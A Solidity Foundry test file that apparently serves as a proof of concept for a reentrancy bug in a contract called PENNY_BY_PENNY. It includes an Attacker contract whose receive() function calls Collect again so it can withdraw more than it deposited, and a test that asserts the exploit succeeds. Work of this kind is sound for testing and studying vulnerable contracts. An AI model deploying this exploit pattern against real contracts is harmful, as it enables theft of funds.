
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PENNY_BY_PENNY, LogFile} from "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public victim;
    LogFile public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new LogFile();
        victim = new PENNY_BY_PENNY();

        victim.SetMinSum(1 wei);
        victim.SetLogFile(address(logFile));
        victim.Initialized();

        _attacker = new Attacker(address(victim));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal < type(uint128).max / 4);

        vm.deal(address(victim), attackVal * 4);
        vm.deal(address(_attacker), attackVal * 4);
        vm.deal(address(this), attackVal * 4);

        vm.warp(block.timestamp + 100);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = PENNY_BY_PENNY(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        victim.Put{value: val}(0);

        (bool ok, ) = address(victim).call(
            abi.encodeWithSelector(victim.Acc.selector, address(this))
        );
        ok;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        victim.Collect(val);

        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }
}
